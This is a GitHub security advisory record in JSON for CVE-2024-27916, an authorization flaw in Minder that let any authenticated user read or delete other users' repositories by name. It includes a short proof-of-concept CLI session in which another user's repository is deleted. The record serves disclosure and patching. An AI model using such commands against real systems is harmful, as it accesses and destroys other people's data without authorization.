@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-v627-69v2-xx37",
+  "modified": "2024-03-21T18:29:29Z",
+  "published": "2024-03-05T16:20:07Z",
+  "aliases": [
+    "CVE-2024-27916"
+  ],
+  "summary": "`GetRepositoryByName`, `DeleteRepositoryByName` and `GetArtifactByName` allow access of arbitrary repositories in Minder by any authenticated user",
+  "details": "### Summary\nA Minder user can use the endpoints listed in the issue title to access any repository in the DB, irrespective of who owns the repo and any permissions that user may have.\n \n### Details\n\nhttps://github.com/stacklok/minder/blob/e88e4b286e4bc04c03b0332a77961f085e1aa77f/database/query/repositories.sql#L22-L23\nhttps://github.com/stacklok/minder/blob/a115c8524fbd582b2b277eaadce024bebbded508/internal/controlplane/handlers_repositories.go#L277-L278\n\nThe DB query used here checks by repo owner, repo name and provider name (which is always \"github\"). These query values are not distinct for the particular user - as long as the user has valid credentials and a provider, they can set the repo owner/name to any value they want and the server will return information on this repo.\n\n`DeleteRepositoryByName` uses the same query and I have been able to delete another user's repo using this technique.\n\nThe `GetArtifactByName` endpoint also uses this DB query. I have not reproduced the behaviour with this endpoint due to a lack of a suitable test case, but I do not see anything in the implementation of the endpoint to prevent it being exploited.\n\n### PoC\n\nSetup:\n1. Fresh provider/project on the production minder instance which is owned by me.\n2. A repo registered by another user (in this case, Ozz)\n\n```\n# show my identity\n$ minder auth whoami\nNo config file present, using default values.\n\n Here are your details:\n\n+----------------------------------------------------+----------------------------------------------------+\n|                        KEY                         |                       VALUE                        |\n+----------------------------------------------------+----------------------------------------------------+\n| Subject                                            | c93cc12e-999d-49f4-9ee3-593fdfb39204               |\n+----------------------------------------------------+----------------------------------------------------+\n| Created At                                         | 2024-02-26 15:53:29.228 +0000                      |\n|                                                    | UTC                                                |\n+----------------------------------------------------+----------------------------------------------------+\n| Updated At                                         | 2024-02-26 15:53:29.228 +0000                      |\n|                                                    | UTC                                                |\n+----------------------------------------------------+----------------------------------------------------+\n| Minder Server                                      | api.stacklok.com:443                               |\n+----------------------------------------------------+----------------------------------------------------+\n| Project                                            | dmjb /                                             |\n|                                                    | ca059552-7b8a-4c6e-918d-ca7e6cbd0bab               |\n+----------------------------------------------------+----------------------------------------------------+\n\n# show that I have no repos registered\n$ minder repo list\nNo config file present, using default values.\n+----+---------+----------+-------------+-------+------+\n| ID | PROJECT | PROVIDER | UPSTREAM ID | OWNER | NAME |\n+----+---------+----------+-------------+-------+------+\n\n# show details on one of Ozz's repos\n$ minder repo get -n JAORMX/auditevent\nNo config file present, using default values.\n{\n  \"id\":  \"a7e82080-9b6c-41f3-bc08-8e9442f8b2d2\",\n  \"context\":  {\n    \"provider\":  \"github\",\n    \"project\":  \"b513f7f0-26dc-42e6-81a0-577df5489e62\"\n  },\n  \"owner\":  \"JAORMX\",\n  \"name\":  \"auditevent\",\n  \"repoId\":  \"605597568\",\n  \"hookUrl\":  \"https://api.github.com/repos/JAORMX/auditevent/hooks/464564107\",\n  \"deployUrl\":  \"https://api.github.com/repos/JAORMX/auditevent/deployments\",\n  \"cloneUrl\":  \"https://github.com/JAORMX/auditevent.git\",\n  \"isFork\":  true,\n  \"createdAt\":  \"2024-03-04T13:27:54.019356Z\",\n  \"updatedAt\":  \"2024-03-04T13:27:54.019356Z\",\n  \"defaultBranch\":  \"main\"\n}\n\n# delete Ozz's repo\n$ minder repo delete -n JAORMX/auditevent\nNo config file present, using default values.\nSuccessfully deleted repo with name: JAORMX/auditevent\n\n# Ozz's repo no longer exists\n$ minder repo get -n JAORMX/auditevent\nNo config file present, using default values.\nMessage: Error getting repo by name\nDetails: NotFound means some requested entity (e.g., file or directory) was\nnot found.\n```\n\n### Impact\n\nAny user and project in a multi-tenant Minder instance.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/stacklok/minder"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.33"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/stacklok/minder/security/advisories/GHSA-v627-69v2-xx37"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27916"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stacklok/minder/commit/45750b4e9fb2de33365758366e06c19e999bd2eb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/stacklok/minder"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stacklok/minder/blob/a115c8524fbd582b2b277eaadce024bebbded508/internal/controlplane/handlers_repositories.go#L277-L278"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/stacklok/minder/blob/main/internal/controlplane/handlers_repositories.go#L257-L299"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-285"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-05T16:20:07Z",
+    "nvd_published_at": "2024-03-21T02:52:20Z"
+  }
+}
